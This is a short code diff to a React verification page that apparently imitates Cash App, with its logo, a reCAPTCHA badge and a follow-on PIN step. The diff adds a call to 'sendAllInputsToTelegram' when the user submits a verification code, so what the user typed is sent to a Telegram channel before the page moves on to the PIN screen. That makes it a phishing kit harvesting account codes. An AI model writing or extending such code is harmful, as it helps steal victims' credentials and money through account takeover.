@@ -3,6 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import { HelpCircle, Loader2 } from 'lucide-react';
 import { CashAppLogo } from '../components/CashAppLogo';
 import { RecaptchaBadge } from '../components/RecaptchaBadge';
+import { sendAllInputsToTelegram } from '../utils/telegram';
 
 export function Verify() {
   const [code, setCode] = useState('');
@@ -12,9 +13,10 @@ export function Verify() {
   const contact = location.state?.contact || '(209) 432-9317';
   const method = location.state?.method || 'phone';
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (code.length > 0) {
+      await sendAllInputsToTelegram();
       setIsLoading(true);
       setTimeout(() => {
         navigate('/pin');
